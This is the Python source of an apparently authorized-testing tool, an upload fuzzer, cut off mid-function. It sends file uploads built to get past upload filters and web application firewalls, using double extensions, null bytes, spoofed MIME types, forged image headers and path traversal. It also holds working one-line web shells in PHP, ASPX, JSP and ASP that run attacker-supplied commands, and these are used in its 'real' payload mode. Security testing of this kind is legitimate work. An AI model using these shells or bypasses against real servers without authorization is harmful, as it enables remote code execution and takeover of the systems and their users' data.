"""
Upload Fuzzer - Core engine for automated upload security testing.
Tests file upload functionality against a comprehensive set of bypass techniques.
"""

import re
import uuid
import time
import requests
from urllib.parse import urljoin, quote
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class FuzzResult:
    """Result of a single fuzz attempt."""
    technique_id: str
    technique_name: str
    category: str
    filename_used: str
    extension: str
    content_type: str
    status_code: int
    response_size: int
    response_time_ms: float
    keyword_match: bool
    regex_match: bool
    matched_keywords: list = field(default_factory=list)
    error: Optional[str] = None
    request_headers: dict = field(default_factory=dict)
    request_body_preview: str = ""

    def to_dict(self):
        return {
            'technique_id': self.technique_id,
            'technique_name': self.technique_name,
            'category': self.category,
            'filename_used': self.filename_used,
            'extension': self.extension,
            'content_type': self.content_type,
            'status_code': self.status_code,
            'response_size': self.response_size,
            'response_time_ms': round(self.response_time_ms, 2),
            'keyword_match': self.keyword_match,
            'regex_match': self.regex_match,
            'matched_keywords': self.matched_keywords,
            'error': self.error,
            'request_headers': self.request_headers,
            'request_body_preview': self.request_body_preview[:500]
        }


class UploadFuzzerCore:
    """
    Core engine for fuzzing file upload functionality.
    Tests bypass techniques against upload endpoints with configurable analysis.
    """

    # ─── Payload Templates ──────────────────────────────────────

    BENIGN_PAYLOAD = b"PTLifeEasy-UploadFuzzer-Probe-v1.0\nThis is a benign test file for security assessment.\n"
    BENIGN_FINGERPRINT = "PTLifeEasy-UploadFuzzer-Probe"

    REAL_PAYLOADS = {
        'php': b'<?php system($_GET["cmd"]); ?>',
        'php_full': b'<?php echo "PTLIFEEASY_MARKER"; if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} echo "PTLIFEEASY_MARKER"; ?>',
        'aspx': b'<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["c"]); %>',
        'jsp': b'<% Runtime.getRuntime().exec(request.getParameter("c")); %>',
        'asp': b'<% Set o = CreateObject("WScript.Shell"): o.Run("cmd /c " & Request("c")) %>',
    }

    # ─── Standard Bypass Techniques ─────────────────────────────

    STANDARD_TECHNIQUES = [
        # --- Extension Manipulation ---
        {
            'id': 'double_ext',
            'name': 'Double Extension',
            'category': 'extension',
            'ext': '.php.jpg',
            'ct': 'image/jpeg',
            'desc': 'Appends allowed extension after blocked one'
        },
        {
            'id': 'double_ext_png',
            'name': 'Double Extension (.png)',
            'category': 'extension',
            'ext': '.php.png',
            'ct': 'image/png',
            'desc': 'PHP disguised as PNG'
        },
        {
            'id': 'double_ext_gif',
            'name': 'Double Extension (.gif)',
            'category': 'extension',
            'ext': '.php.gif',
            'ct': 'image/gif',
            'desc': 'PHP disguised as GIF'
        },
        {
            'id': 'reverse_double_ext',
            'name': 'Reverse Double Ext (.jpg.php)',
            'category': 'extension',
            'ext': '.jpg.php',
            'ct': 'image/jpeg',
            'desc': 'Allowed extension before malicious one — bypasses filters checking only the first extension'
        },
        {
            'id': 'reverse_double_ext_png',
            'name': 'Reverse Double Ext (.png.php)',
            'category': 'extension',
            'ext': '.png.php',
            'ct': 'image/png',
            'desc': 'PNG extension before PHP — bypasses first-extension-only filters'
        },
        {
            'id': 'null_byte',
            'name': 'Null Byte Injection',
            'category': 'extension',
            'ext': '.php%00.jpg',
            'ct': 'image/jpeg',
            'desc': 'Null byte to truncate extension server-side'
        },
        {
            'id': 'null_byte_raw',
            'name': 'Null Byte (Raw)',
            'category': 'extension',
            'ext': '.php\x00.jpg',
            'ct': 'image/jpeg',
            'desc': 'Raw null byte in filename'
        },
        {
            'id': 'case_mixed',
            'name': 'Case Manipulation',
            'category': 'extension',
            'ext': '.PhP',
            'ct': 'application/x-httpd-php',
            'desc': 'Mixed case to bypass case-sensitive filters'
        },
        {
            'id': 'case_upper',
            'name': 'Uppercase Extension',
            'category': 'extension',
            'ext': '.PHP',
            'ct': 'application/x-httpd-php',
            'desc': 'All uppercase extension'
        },
        {
            'id': 'trailing_dot',
            'name': 'Trailing Dot',
            'category': 'extension',
            'ext': '.php.',
            'ct': 'application/x-httpd-php',
            'desc': 'Trailing dot (Windows strips it)'
        },
        {
            'id': 'trailing_space',
            'name': 'Trailing Space',
            'category': 'extension',
            'ext': '.php ',
            'ct': 'application/x-httpd-php',
            'desc': 'Trailing space bypass'
        },
        {
            'id': 'semicolon',
            'name': 'Semicolon Separator',
            'category': 'extension',
            'ext': '.php;.jpg',
            'ct': 'image/jpeg',
            'desc': 'Semicolon to confuse parsers'
        },
        {
            'id': 'multiext_dot',
            'name': 'Multi-Extension Dot',
            'category': 'extension',
            'ext': '.php......',
            'ct': 'application/x-httpd-php',
            'desc': 'Multiple trailing dots'
        },
        {
            'id': 'unicode_dot',
            'name': 'Unicode Dot',
            'category': 'extension',
            'ext': '.php%E2%80%8B.jpg',
            'ct': 'image/jpeg',
            'desc': 'Zero-width space before real extension'
        },

        # --- Alternative Extensions ---
        {
            'id': 'phtml',
            'name': 'PHTML Extension',
            'category': 'alt_ext',
            'ext': '.phtml',
            'ct': 'application/x-httpd-php',
            'desc': 'Alternative PHP extension often missed'
        },
        {
            'id': 'pht',
            'name': 'PHT Extension',
            'category': 'alt_ext',
            'ext': '.pht',
            'ct': 'application/x-httpd-php',
            'desc': 'Rare PHP extension'
        },
        {
            'id': 'php5',
            'name': 'PHP5 Extension',
            'category': 'alt_ext',
            'ext': '.php5',
            'ct': 'application/x-httpd-php',
            'desc': 'PHP5 extension bypass'
        },
        {
            'id': 'php7',
            'name': 'PHP7 Extension',
            'category': 'alt_ext',
            'ext': '.php7',
            'ct': 'application/x-httpd-php',
            'desc': 'PHP7 extension bypass'
        },
        {
            'id': 'phar',
            'name': 'PHAR Extension',
            'category': 'alt_ext',
            'ext': '.phar',
            'ct': 'application/x-httpd-php',
            'desc': 'PHP Archive extension'
        },
        {
            'id': 'shtml',
            'name': 'SHTML Extension',
            'category': 'alt_ext',
            'ext': '.shtml',
            'ct': 'text/html',
            'desc': 'Server-side include bypass'
        },
        {
            'id': 'phps',
            'name': 'PHPS Extension',
            'category': 'alt_ext',
            'ext': '.phps',
            'ct': 'application/x-httpd-php-source',
            'desc': 'PHP source extension'
        },
        {
            'id': 'inc',
            'name': 'INC Extension',
            'category': 'alt_ext',
            'ext': '.inc',
            'ct': 'application/x-httpd-php',
            'desc': 'PHP include file extension'
        },

        # --- MIME Type Spoofing ---
        {
            'id': 'mime_image',
            'name': 'MIME: image/jpeg',
            'category': 'mime',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'Spoof Content-Type as JPEG'
        },
        {
            'id': 'mime_png',
            'name': 'MIME: image/png',
            'category': 'mime',
            'ext': '.php',
            'ct': 'image/png',
            'desc': 'Spoof Content-Type as PNG'
        },
        {
            'id': 'mime_gif',
            'name': 'MIME: image/gif',
            'category': 'mime',
            'ext': '.php',
            'ct': 'image/gif',
            'desc': 'Spoof Content-Type as GIF'
        },
        {
            'id': 'mime_text',
            'name': 'MIME: text/plain',
            'category': 'mime',
            'ext': '.php',
            'ct': 'text/plain',
            'desc': 'Spoof Content-Type as plain text'
        },
        {
            'id': 'mime_octet',
            'name': 'MIME: application/octet-stream',
            'category': 'mime',
            'ext': '.php',
            'ct': 'application/octet-stream',
            'desc': 'Generic binary MIME type'
        },

        # --- Magic Bytes ---
        {
            'id': 'magic_gif89a',
            'name': 'Magic Bytes: GIF89a',
            'category': 'magic',
            'ext': '.php',
            'ct': 'image/gif',
            'desc': 'GIF89a header prepended to PHP code',
            'prepend': b'GIF89a;\n'
        },
        {
            'id': 'magic_png',
            'name': 'Magic Bytes: PNG',
            'category': 'magic',
            'ext': '.php',
            'ct': 'image/png',
            'desc': 'PNG header prepended',
            'prepend': b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82\n'
        },
        {
            'id': 'magic_jpg',
            'name': 'Magic Bytes: JPEG',
            'category': 'magic',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'JPEG header prepended',
            'prepend': b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\n'
        },
        {
            'id': 'magic_pdf',
            'name': 'Magic Bytes: PDF',
            'category': 'magic',
            'ext': '.php',
            'ct': 'application/pdf',
            'desc': 'PDF header prepended',
            'prepend': b'%PDF-1.4\n%\x80\x80\x80\x80\n'
        },

        # --- Content-Disposition Tricks ---
        {
            'id': 'cd_no_quotes',
            'name': 'CD: No Quotes',
            'category': 'header',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'Filename without quotes in Content-Disposition'
        },
        {
            'id': 'cd_single_quote',
            'name': 'CD: Single Quotes',
            'category': 'header',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'Single quotes around filename'
        },

        # --- Server-Specific ---
        {
            'id': 'aspx_ext',
            'name': 'ASPX Extension',
            'category': 'server',
            'ext': '.aspx',
            'ct': 'application/octet-stream',
            'desc': 'ASP.NET webshell extension'
        },
        {
            'id': 'asp_ext',
            'name': 'ASP Extension',
            'category': 'server',
            'ext': '.asp',
            'ct': 'application/octet-stream',
            'desc': 'Classic ASP extension'
        },
        {
            'id': 'jsp_ext',
            'name': 'JSP Extension',
            'category': 'server',
            'ext': '.jsp',
            'ct': 'application/octet-stream',
            'desc': 'Java JSP extension'
        },
        {
            'id': 'jspx_ext',
            'name': 'JSPX Extension',
            'category': 'server',
            'ext': '.jspx',
            'ct': 'application/octet-stream',
            'desc': 'JSP XML variant'
        },
        {
            'id': 'war_ext',
            'name': 'WAR Extension',
            'category': 'server',
            'ext': '.war',
            'ct': 'application/octet-stream',
            'desc': 'Tomcat WAR archive'
        },
        {
            'id': 'cfm_ext',
            'name': 'CFM Extension',
            'category': 'server',
            'ext': '.cfm',
            'ct': 'application/octet-stream',
            'desc': 'ColdFusion extension'
        },

        # --- Path Traversal in filename ---
        {
            'id': 'path_traversal',
            'name': 'Path Traversal',
            'category': 'path',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'Path traversal in filename',
            'filename_override': '../uploads/shell.php'
        },
        {
            'id': 'path_traversal_enc',
            'name': 'Path Traversal (URL Encoded)',
            'category': 'path',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'URL-encoded path traversal',
            'filename_override': '..%2fuploads%2fshell.php'
        },
    ]

    # ─── WAF Bypass Techniques ──────────────────────────────────

    WAF_TECHNIQUES = [
        {
            'id': 'waf_boundary_spaces',
            'name': 'WAF: Boundary Spaces',
            'category': 'waf',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'Spaces appended to multipart boundary',
            'boundary_suffix': ' '
        },
        {
            'id': 'waf_boundary_dash',
            'name': 'WAF: Boundary Dashes',
            'category': 'waf',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'Extra dashes in boundary',
            'boundary_suffix': '--'
        },
        {
            'id': 'waf_boundary_semicolon',
            'name': 'WAF: Boundary Semicolon',
            'category': 'waf',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'Semicolon appended to boundary',
            'boundary_suffix': ';'
        },
        {
            'id': 'waf_boundary_null',
            'name': 'WAF: Boundary Null Byte',
            'category': 'waf',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'Null byte in boundary',
            'boundary_suffix': '\x00'
        },
        {
            'id': 'waf_boundary_lf',
            'name': 'WAF: Boundary LF',
            'category': 'waf',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'Line feed before boundary',
            'boundary_prefix': '\n'
        },
        {
            'id': 'waf_filename_enc',
            'name': 'WAF: Filename URL Encoded',
            'category': 'waf',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'URL-encoded filename in Content-Disposition',
            'filename_encoded': True
        },
        {
            'id': 'waf_filename_double_enc',
            'name': 'WAF: Filename Double Encoded',
            'category': 'waf',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'Double URL-encoded filename',
            'filename_double_encoded': True
        },
        {
            'id': 'waf_cd_mixed_case',
            'name': 'WAF: CD Mixed Case',
            'category': 'waf',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'Mixed case Content-Disposition header name',
            'cd_mixed_case': True
        },
        {
            'id': 'waf_ct_obfuscation',
            'name': 'WAF: CT Obfuscation',
            'category': 'waf',
            'ext': '.php',
            'ct': 'image/jpeg; charset=utf-8',
            'desc': 'Charset appended to Content-Type'
        },
        {
            'id': 'waf_multiple_ct',
            'name': 'WAF: Multiple Content-Type',
            'category': 'waf',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'Multiple Content-Type headers',
            'extra_headers': {'Content-Type': 'text/plain'}
        },
        {
            'id': 'waf_chunked',
            'name': 'WAF: Chunked Encoding',
            'category': 'waf',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'Chunked transfer encoding',
            'use_chunked': True
        },
        {
            'id': 'waf_oversized_boundary',
            'name': 'WAF: Oversized Boundary',
            'category': 'waf',
            'ext': '.php',
            'ct': 'image/jpeg',
            'desc': 'Very long boundary string',
            'boundary_override': '-' * 128 + 'boundary'
        },
    ]

    def __init__(self, url: str, field_name: str = 'file',
                 cookies: str = '', headers: str = '',
                 proxy: dict = None, timeout: int = 15,
                 payload_mode: str = 'benign',
                 enable_waf: bool = False,
                 success_keywords: str = '',
                 success_regex: str = '',
                 extra_fields: dict = None,
                 custom_baseline: bytes = None,
                 custom_baseline_filename: str = None,
                 custom_baseline_content_type: str = None,
                 enabled_extensions: list = None):
        self.url = url
        self.field_name = field_name
        self.timeout = timeout
        self.payload_mode = payload_mode
        self.enable_waf = enable_waf
        self.extra_fields = extra_fields or {}
        self.custom_baseline = custom_baseline
        self.custom_baseline_filename = custom_baseline_filename
        self.custom_baseline_content_type = custom_baseline_content_type
        self.enabled_extensions = enabled_extensions or []

        # Parse custom headers
        self.custom_headers = {}
        if headers:
            for line in headers.strip().split('\n'):
                if ':' in line:
                    k, v = line.split(':', 1)
                    self.custom_headers[k.strip()] = v.strip()

        # Parse cookies
        self.cookies = {}
        if cookies:
            for item in cookies.strip().split(';'):
                if '=' in item:
                    k, v = item.split('=', 1)
                    self.cookies[k.strip()] = v.strip()

        # Proxy
        self.proxy = proxy

        # Success detection
        self.success_keywords = [kw.strip().lower() for kw in success_keywords.split(',') if kw.strip()]
        self.success_regex = re.compile(success_regex) if success_regex else None

        # Session
        self.session = requests.Session()

        # Results
        self.results: list[FuzzResult] = []
        self.baseline_result: Optional[FuzzResult] = None

    # ─── Payload Selection ──────────────────────────────────────

    def _get_payload(self, technique: dict) -> bytes:
        """Get the appropriate payload for a technique based on mode."""
        ext = technique['ext'].lstrip('.')

        if self.payload_mode == 'benign':
            return self.BENIGN_PAYLOAD

        # Real payload mode - select based on extension
        ext_map = {
            'php': 'php_full',
            'phtml': 'php_full',
            'pht': 'php_full',
            'php5': 'php_full',
            'php7': 'php_full',
            'phar': 'php_full',
            'phps': 'php_full',
            'shtml': 'php_full',
            'inc': 'php_full',
            'aspx': 'aspx',
            'asp': 'asp',
            'jsp': 'jsp',
            'jspx': 'jsp',
            'cfm': 'php_full',
            'war': 'jsp',
        }
        payload_key = ext_map.get(ext, 'php_full')
        return self.REAL_PAYLOADS.get(payload_key, self.REAL_PAYLOADS['php_full'])

    def _get_filename(self, technique: dict) -> str:
        """Generate filename for a technique."""
        if 'filename_override' in technique:
            return technique['filename_override']
        return f'test_{uuid.uuid4().hex[:6]}{technique["ext"]}'

    # ─── Request Building ───────────────────────────────────────

    def _build_multipart_body(self, technique: dict, payload: bytes, filename: str) -> tuple:
        """Build multipart form-data body. Returns (body, headers)."""
        boundary = technique.get('boundary_override', f'----PTLifeEasyBoundary{uuid.uuid4().hex[:12]}')

        # WAF boundary modifications
        if technique.get('boundary_prefix'):
            boundary = technique['boundary_prefix'] + boundary
        if technique.get('boundary_suffix'):
            boundary = boundary + technique['boundary_suffix']

        ct_header = technique['ct']

        # Build body parts
        body_parts = []

        # Add extra fields first
        for fname, fvalue in self.extra_fields.items():
            body_parts.append(f'--{boundary}\r\n'.encode())
            body_parts.append(f'Content-Disposition: form-data; name="{fname}"\r\n\r\n'.encode())
            body_parts.append(f'{fvalue}\r\n'.encode())

        # File part
        body_parts.append(f'--{boundary}\r\n'.encode())

        # Content-Disposition with optional WAF tricks
        cd_name = 'Content-Disposition'
        if technique.get('cd_mixed_case'):
            cd_name = 'cOnTeNt-DiSpOsItIoN'

        if technique.get('filename_encoded'):
            encoded_name = quote(filename)
            body_parts.append(f'{cd_name}: form-data; name="{self.field_name}"; filename="{encoded_name}"\r\n'.encode())
        elif technique.get('filename_double_encoded'):
            encoded_name = quote(quote(filename))
            body_parts.append(f'{cd_name}: form-data; name="{self.field_name}"; filename="{encoded_name}"\r\n'.encode())
        elif technique['id'] == 'cd_no_quotes':
            body_parts.append(f'{cd_name}: form-data; name={self.field_name}; filename={filename}\r\n'.encode())
        elif technique['id'] == 'cd_single_quote':
            body_parts.append(f"{cd_name}: form-data; name='{self.field_name}'; filename='{filename}'\r\n".encode())
        else:
            body_parts.append(f'{cd_name}: form-data; name="{self.field_name}"; filename="{filename}"\r\n'.encode())

        body_parts.append(f'Content-Type: {ct_header}\r\n\r\n'.encode())

        # Prepend magic bytes if specified
        if 'prepend' in technique:
            body_parts.append(technique['prepend'])
        body_parts.append(payload)
        body_parts.append(b'\r\n')
        body_parts.append(f'--{boundary}--\r\n'.encode())

        body = b''.join(body_parts)

        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}',
        }

        # WAF: multiple Content-Type headers
        if 'extra_headers' in technique:
            headers.update(technique['extra_headers'])

        return body, headers

    def _build_request(self, technique: dict) -> tuple:
        """Build the full request for a technique. Returns (method, url, headers, body)."""
        payload = self._get_payload(technique)
        filename = self._get_filename(technique)

        body, multipart_headers = self._build_multipart_body(technique, payload, filename)

        # Merge all headers
        headers = {**self.custom_headers, **multipart_headers}

        # Chunked encoding
        if technique.get('use_chunked'):
            headers['Transfer-Encoding'] = 'chunked'

        return 'POST', self.url, headers, body

    # ─── Response Analysis ──────────────────────────────────────

    def _analyze_response(self, response: requests.Response, technique: dict) -> dict:
        """Analyze response for success indicators."""
        text_lower = response.text.lower() if response.text else ''

        # Keyword matching
        matched_keywords = []
        for kw in self.success_keywords:
            if kw in text_lower:
                matched_keywords.append(kw)

        # Regex matching
        regex_match = False
        if self.success_regex:
            regex_match = bool(self.success_regex.search(response.text or ''))

        return {
            'keyword_match': len(matched_keywords) > 0 if self.success_keywords else None,
            'regex_match': regex_match if self.success_regex else None,
            'matched_keywords': matched_keywords
        }

    # ─── Baseline ───────────────────────────────────────────────

    def run_baseline(self) -> FuzzResult:
        """Send a normal upload to establish baseline. Uses custom file if provided."""
        if self.custom_baseline:
            payload = self.custom_baseline
            filename = self.custom_baseline_filename or 'baseline_custom'
            ct = self.custom_baseline_content_type or 'application/octet-stream'
            technique = {
                'id': 'baseline',
                'name': f'Baseline (Custom: {filename})',
                'category': 'baseline',
                'ext': '',
                'ct': ct,
                'desc': f'Custom baseline file: {filename}'
            }
        else:
            payload = b'PTLifeEasy Baseline Test - Normal Upload\n'
            filename = 'baseline_test.txt'
            ct = 'text/plain'
            technique = {
                'id': 'baseline',
                'name': 'Baseline (Normal Upload)',
                'category': 'baseline',
                'ext': '.txt',
                'ct': ct,
                'desc': 'Normal text file upload for baseline comparison'
            }

        body, mp_headers = self._build_multipart_body(technique, payload, filename)
        headers = {**self.custom_headers, **mp_headers}

        result = self._execute_request(technique, headers, body, filename)
        self.baseline_result = result
        return result

    # ─── Execution ──────────────────────────────────────────────

    def _execute_request(self, technique: dict, headers: dict, body: bytes, filename: str) -> FuzzResult:
        """Execute a single fuzz request and return result."""
        start_time = time.time()

        try:
            response = self.session.post(
                self.url,
                headers=headers,
                data=body,
                cookies=self.cookies if self.cookies else None,
                proxies=self.proxy,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False
            )

            elapsed = (time.time() - start_time) * 1000
            analysis = self._analyze_response(response, technique)

            return FuzzResult(
                technique_id=technique['id'],
                technique_name=technique['name'],
                category=technique['category'],
                filename_used=filename,
                extension=technique['ext'],
                content_type=technique['ct'],
                status_code=response.status_code,
                response_size=len(response.content),
                response_time_ms=elapsed,
                keyword_match=analysis['keyword_match'],
                regex_match=analysis['regex_match'],
                matched_keywords=analysis['matched_keywords'],
                request_headers={k: v for k, v in headers.items()},
                request_body_preview=body.decode('utf-8', errors='replace')[:500]
            )

        except requests.exceptions.Timeout:
            elapsed = (time.time() - start_time) * 1000
            return FuzzResult(
                technique_id=technique['id'],
                technique_name=technique['name'],
                category=technique['category'],
                filename_used=filename,
                extension=technique['ext'],
                content_type=technique['ct'],
                status_code=0,
                response_size=0,
                response_time_ms=elapsed,
                keyword_match=False,
                regex_match=False,
                error='Request timed out'
            )
        except requests.exceptions.ConnectionError as e:
            elapsed = (time.time() - start_time) * 1000
            return FuzzResult(
                technique_id=technique['id'],
                technique_name=technique['name'],
                category=technique['category'],
                filename_used=filename,
                extension=technique['ext'],
                content_type=technique['ct'],
                status_code=0,
                response_size=0,
                response_time_ms=elapsed,
                keyword_match=False,
                regex_match=False,
                error=f'Connection error: {str(e)}'
            )
        except Exception as e:
            elapsed = (time.time() - start_time) * 1000
            return FuzzResult(
                technique_id=technique['id'],
                technique_name=technique['name'],
                category=technique['category'],
                filename_used=filename,
                extension=technique['ext'],
                content_type=technique['ct'],
                status_code=0,
                response_size=0,
                response_time_ms=elapsed,
                keyword_match=False,
                regex_match=False,
                error=str(e)
            )

    def run_all(self, progress_callback=None) -> list:
        """Run all techniques and return results."""
        self.results = []

        # Run baseline first
        baseline = self.run_baseline()
        self.results.append(baseline)

        # Collect all techniques (dynamic if enabled_extensions, else static)
        techniques = self._generate_techniques()

        total = len(techniques)
        for i, technique in enumerate(techniques):
            payload = self._get_payload(technique)
            filename = self._get_filename(technique)
            body, mp_headers = self._build_multipart_body(technique, payload, filename)
            headers = {**self.custom_headers, **mp_headers}

            result = self._execute_request(technique, headers, body, filename)
            self.results.append(result)

            if progress_callback:
                progress_callback(i + 1, total, technique['name'])

        return [r.to_dict() for r in self.results]

    def _generate_techniques(self) -> list:
        """
        Generate the list of techniques to test.
        If enabled_extensions is provided, dynamically generates technique variants
        tailored to those specific extensions for more accurate testing.
        Otherwise falls back to the default static technique list.
        """
        if not self.enabled_extensions:
            techniques = list(self.STANDARD_TECHNIQUES)
            if self.enable_waf:
                techniques.extend(self.WAF_TECHNIQUES)
            return techniques

        # ─── Dynamic generation based on enabled extensions ───
        exts = self.enabled_extensions
        techniques = []

        # MIME type mapping for common extensions
        ext_mime_map = {
            'jpg': 'image/jpeg', 'jpeg': 'image/jpeg',
            'png': 'image/png', 'gif': 'image/gif',
            'bmp': 'image/bmp', 'webp': 'image/webp',
            'svg': 'image/svg+xml', 'ico': 'image/x-icon',
            'pdf': 'application/pdf',
            'doc': 'application/msword',
            'docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            'xls': 'application/vnd.ms-excel',
            'xlsx': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
            'ppt': 'application/vnd.ms-powerpoint',
            'pptx': 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
            'zip': 'application/zip', 'rar': 'application/x-rar-compressed',
            '7z': 'application/x-7z-compressed', 'tar': 'application/x-tar',
            'gz': 'application/gzip',
            'txt': 'text/plain', 'csv': 'text/csv',
            'html': 'text/html', 'htm': 'text/html',
            'xml': 'application/xml', 'json': 'application/json',
            'mp4': 'video/mp4', 'mp3': 'audio/mpeg',
            'wav': 'audio/wav', 'avi': 'video/x-msvideo',
        }

        # For each enabled extension, generate tailored techniques
        for ext in exts:
            ext_clean = ext.lstrip('.')
            mime = ext_mime_map.get(ext_clean, 'application/octet-stream')
            ext_dot = f'.{ext_clean}'

            # 1. Double Extension (PHP disguised as allowed ext)
            techniques.append({
                'id': f'double_ext_{ext_clean}',
                'name': f'Double Ext: .php{ext_dot}',
                'category': 'extension',
                'ext': f'.php{ext_dot}',
                'ct': mime,
                'desc': f'PHP file disguised as .{ext_clean}'
            })

            # 1b. Reverse Double Extension (allowed ext before malicious)
            techniques.append({
                'id': f'reverse_double_ext_{ext_clean}',
                'name': f'Reverse Double Ext: {ext_dot}.php',
                'category': 'extension',
                'ext': f'{ext_dot}.php',
                'ct': mime,
                'desc': f'Allowed .{ext_clean} before .php — bypasses first-extension-only filters'
            })

            # 2. Null Byte Injection
            techniques.append({
                'id': f'null_byte_{ext_clean}',
                'name': f'Null Byte: .php%00{ext_dot}',
                'category': 'extension',
                'ext': f'.php%00{ext_dot}',
                'ct': mime,
                'desc': f'Null byte truncation with .{ext_clean}'
            })

            # 3. Case manipulation
            techniques.append({
                'id': f'case_mixed_{ext_clean}',
                'name': f'Case: .PhP{ext_dot}',
                'category': 'extension',
                'ext': f'.PhP{ext_dot}',
                'ct': mime,
                'desc': f'Mixed case PHP with .{ext_clean}'
            })

            # 4. Trailing dot
            techniques.append({
                'id': f'trailing_dot_{ext_clean}',
                'name': f'Trailing Dot: .php{ext_dot}.',
                'category': 'extension',
                'ext': f'.php{ext_dot}.',
                'ct': mime,
                'desc': f'Trailing dot with .{ext_clean}'
            })

            # 5. Trailing space
            techniques.append({
                'id': f'trailing_space_{ext_clean}',
                'name': f'Trailing Space: .php{ext_dot} ',
                'category': 'extension',
                'ext': f'.php{ext_dot} ',
                'ct': mime,
                'desc': f'Trailing space with .{ext_clean}'
            })

            # 6. Semicolon separator
            techniques.append({
                'id': f'semicolon_{ext_clean}',
                'name': f'Semicolon: .php;{ext_dot}',
                'category': 'extension',
                'ext': f'.php;{ext_dot}',
                'ct': mime,
                'desc': f'Semicolon separator with .{ext_clean}'
            })

            # 7. MIME spoofing (PHP extension, spoofed MIME)
            techniques.append({
                'id': f'mime_{ext_clean}',
                'name': f'MIME Spoof: .php as {mime}',
                'category': 'mime',
                'ext': '.php',
                'ct': mime,
                'desc': f'PHP file with {ext_clean} MIME type'
            })

            # 8. Magic bytes (prepend allowed file header)
            if ext_clean in ('jpg', 'jpeg'):
                magic = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\n'
            elif ext_clean == 'png':
                magic = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82\n'
            elif ext_clean == 'gif':
                magic = b'GIF89a;\n'
            elif ext_clean == 'pdf':
                magic = b'%PDF-1.4\n%\x80\x80\x80\x80\n'
            else:
                magic = None

            if magic:
                techniques.append({
                    'id': f'magic_{ext_clean}',
                    'name': f'Magic Bytes: {ext_clean.upper()} header + PHP',
                    'category': 'magic',
                    'ext': f'.php{ext_dot}',
                    'ct': mime,
                    'desc': f'{ext_clean.upper()} magic bytes prepended to PHP code',
                    'prepend': magic
                })

        # Add alternative PHP extensions (not tied to enabled exts, always useful)
        alt_exts = [
            ('phtml', 'application/x-httpd-php'),
            ('pht', 'application/x-httpd-php'),
            ('php5', 'application/x-httpd-php'),
            ('php7', 'application/x-httpd-php'),
            ('phar', 'application/x-httpd-php'),
            ('shtml', 'text/html'),
            ('phps', 'application/x-httpd-php-source'),
            ('inc', 'application/x-httpd-php'),
        ]
        for alt_ext, alt_ct in alt_exts:
            techniques.append({
                'id': f'alt_{alt_ext}',
                'name': f'Alt Ext: .{alt_ext}',
                'category': 'alt_ext',
                'ext': f'.{alt_ext}',
                'ct': alt_ct,
                'desc': f'Alternative {alt_ext.upper()} extension'
            })

        # Add server-specific extensions
        server_exts = [
            ('aspx', 'ASP.NET webshell'),
            ('asp', 'Classic ASP'),
            ('jsp', 'Java JSP'),
            ('jspx', 'JSP XML variant'),
            ('cfm', 'ColdFusion'),
        ]
        for srv_ext, srv_desc in server_exts:
            techniques.append({
                'id': f'server_{srv_ext}',
                'name': f'Server: .{srv_ext}',
                'category': 'server',
                'ext': f'.{srv_ext}',
                'ct': 'application/octet-stream',
                'desc': srv_desc
            })

        # Content-Disposition tricks
        techniques.append({
            'id': 'cd_no_quotes',
            'name': 'CD: No Quotes',
            'category': 'header',
            'ext': '.php',
            'ct': mime if exts else 'image/jpeg',
            'desc': 'Filename without quotes in Content-Disposition'
        })
        techniques.append({
            'id': 'cd_single_quote',
            'name': 'CD: Single Quotes',
            'category': 'header',
            'ext': '.php',
            'ct': mime if exts else 'image/jpeg',
            'desc': 'Single quotes around filename'
        })

        # Path traversal
        techniques.append({
            'id': 'path_traversal',
            'name': 'Path Traversal',
            'category': 'path',
            'ext': '.php',
            'ct': mime if exts else 'image/jpeg',
            'desc': 'Path traversal in filename',
            'filename_override': '../uploads/shell.php'
        })
        techniques.append({
            'id': 'path_traversal_enc',
            'name': 'Path Traversal (URL Encoded)',
            'category': 'path',
            'ext': '.php',
            'ct': mime if exts else 'image/jpeg',
            'desc': 'URL-encoded path traversal',
            'filename_override': '..%2fuploads%2fshell.php'
        })

        # WAF techniques (if enabled)
        if self.enable_waf:
            for waf_t in self.WAF_TECHNIQUES:
                # Adapt WAF technique to use first enabled extension's MIME
                waf_adapted = dict(waf_t)
                if exts:
                    waf_adapted['ct'] = ext_mime_map.get(exts[0].lstrip('.'), 'application/octet-stream')
                techniques.append(waf_adapted)

        return techniques

    def get_summary(self) -> dict:
        """Get a summary of the fuzzing results."""
        if not self.results:
